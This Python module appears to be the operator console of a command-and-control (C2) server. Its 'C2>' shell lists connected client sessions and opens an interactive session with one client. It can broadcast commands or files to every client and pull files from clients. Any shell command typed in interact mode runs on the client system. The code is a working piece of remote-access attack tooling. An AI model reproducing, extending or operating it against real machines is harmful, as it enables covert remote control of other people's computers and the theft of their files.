# ======================== CONFIGURATION ========================
from .sessions import list_sessions, close_all_sessions

# ======================== INTERACT MODE ========================
def _enter_interact_mode(cid, base_dir, db_hooks, shutdown_event):
    """Enter interactive mode with a client."""
    from .command_dispatch import send_command_to_client
    
    print(f"[*] Interacting with ID {cid}")
    
    while True:
        if shutdown_event and shutdown_event.is_set():
            break
        
        try:
            sub_cmd = input(f"C2[{cid}]> ").strip()
            
            if sub_cmd == "background":
                break
            
            if sub_cmd == "sendfile":
                send_command_to_client(cid, sub_cmd, base_dir, db_hooks, "interact")
            elif sub_cmd.startswith("pull "):
                send_command_to_client(cid, sub_cmd, base_dir, db_hooks, "interact")
            elif sub_cmd:
                send_command_to_client(cid, sub_cmd, base_dir, db_hooks, "interact")
                
        except KeyboardInterrupt:
            print("\n[!] Returning to main shell")
            break
        except Exception as e:
            print(f"[!] Error: {e}")

# ======================== HELP TEXT ========================
def _show_help():
    """Display help information."""
    help_text = """
[*] Available Commands:

 GLOBAL COMMANDS:
  sessions                     - List all active client sessions
  interact <id>                - Interact with a specific client
  broadcast <command>          - Send a command to ALL clients
  broadcastfile                - Send a file to ALL clients
  help                         - Show this help menu
  exit                         - Shut down the server

 INTERACT MODE COMMANDS (after `interact <id>`):
  sendfile                     - Send a file to the selected client
  pull <path>                  - Pull a file from the client
  background                   - Return to main shell
  <any shell command>          - Execute on client system
"""
    print(help_text)

# ======================== COMMAND PARSING ========================
def _parse_interact_command(cmd):
    """Parse interact command."""
    try:
        parts = cmd.split()
        if len(parts) != 2:
            return None
        return int(parts[1])
    except:
        return None

# ======================== MAIN SHELL ========================
def server_shell(base_dir, db_hooks, shutdown_event=None):
    """Main server shell."""
    from .command_dispatch import broadcast_command
    from .file_transfers import broadcast_sendfile
    
    print("\nType 'help' for commands\n")
    
    while True:
        if shutdown_event and shutdown_event.is_set():
            break
            
        try:
            cmd = input("C2> ").strip()
            if not cmd:
                continue
            
            if cmd == "sessions":
                list_sessions()
            
            elif cmd.startswith("interact "):
                cid = _parse_interact_command(cmd)
                if cid is not None:
                    _enter_interact_mode(cid, base_dir, db_hooks, shutdown_event)
                else:
                    print("[!] Usage: interact <id>")
            
            elif cmd == "broadcastfile":
                broadcast_sendfile(base_dir, db_hooks["record_transfer"])
            
            elif cmd.startswith("broadcast "):
                broadcast_command(cmd[10:], db_hooks)
            
            elif cmd == "help":
                _show_help()
            
            elif cmd == "exit":
                print("[!] Shutting down")
                if shutdown_event:
                    shutdown_event.set()
                close_all_sessions()
                break
            
            else:
                print("[!] Unknown command")
        
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            continue
        except EOFError:
            print("\n[!] Exiting")
            break
        except Exception as e:
            if shutdown_event and shutdown_event.is_set():
                break
            print(f"[!] Error: {e}")